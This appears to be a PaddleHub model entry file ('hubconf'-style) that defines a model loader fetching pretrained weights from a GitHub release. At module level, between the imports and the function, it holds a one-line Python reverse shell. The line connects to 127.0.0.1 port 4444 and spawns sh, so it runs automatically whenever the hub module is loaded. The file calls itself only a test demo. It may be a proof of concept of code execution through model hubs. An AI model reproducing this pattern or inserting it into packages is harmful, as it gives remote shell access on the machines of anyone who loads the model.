dependencies = ['paddle']

import paddle
from model import MM as _MM


import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
def MM(out_channels=8, pretrained=False):
    '''This is a test demo for paddle hub
    '''
    mm = _MM(out_channels)
    if pretrained:
        url = 'https://github.com/lyuwenyu/paddlehub_demo/releases/download/v1.0/params.pd'
        path = paddle.utils.download.get_weights_path_from_url(url)
        mm.set_state_dict(paddle.load(path))
    return mm